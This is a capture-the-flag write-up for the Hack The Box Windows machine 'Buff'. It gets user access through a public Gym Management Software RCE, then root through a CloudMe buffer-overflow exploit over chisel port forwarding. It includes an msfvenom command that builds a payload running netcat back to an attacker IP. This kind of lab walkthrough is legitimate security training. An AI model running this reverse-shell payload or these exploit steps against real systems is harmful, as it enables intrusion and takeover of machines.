---
layout: default
title: Buff
permalink: /writeup/buff/
lang: en
---

<img src="./img/buff.png"  width="650"/>

Buff is a Windows machine. The ip of the box is 10.10.10.198.

# Recon

I starting with *nmap* scan `nmap -sC -Sv -oA nmap/buff 10.10.10.198`

<img src="./img/nmap.png"  width="650"/>


And i found only:
- *webserver apache* on port 8080

I navigate on `http://10.10.10.198:8080` and got a webpage

<img src="./img/home.png"  width="650"/> 

so i start to navigate and on `contact` page i found 

<img src="./img/home2.png"  width="650"/> 

that says that this site is made with `Gym Management Software 1.0`.
I search for some exploit and found [this](https://www.exploit-db.com/exploits/48506)(RCE).


# User
Now i run the exploit 

<img src="./img/rce.png"  width="650"/>

and can execute  arbitrary commands as user `shaun` and can take the user's flag 

<img src="./img/userflag.png"  width="650"/>

# Root

Now i upload `netcat` and connect with a rev shell

and move to `C:\Users\shaun\Downloads` and found `CloudMe_1122.exe` 

<img src="./img/cloudme.png"  width="650"/>

I search for CloudMe and found there is BOF a vulnerability and found a [exploit](https://www.exploit-db.com/exploits/48389).

The `cloud me` running on the remote machine and i cannot access remotely furthermore the machine hasn't python so cannot execute the exploit. 

So i need to forward the port 8888 on my machine, for this i used `chisel`.
Furthermore i need to upload the payload for the exploit.

> msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.152' -b '\x00\x0A\x0D' -f python -v payload

<img src="./img/msfvenom.png"  width="650"/>

Finally run the exploit and got shell as `Administrator`

<img src="./img/exploit.png"  width="650"/>

and the flag

<img src="./img/rootflag.png"  width="650"/>


<img src="./img/buffpwn.png"  width="650"/>
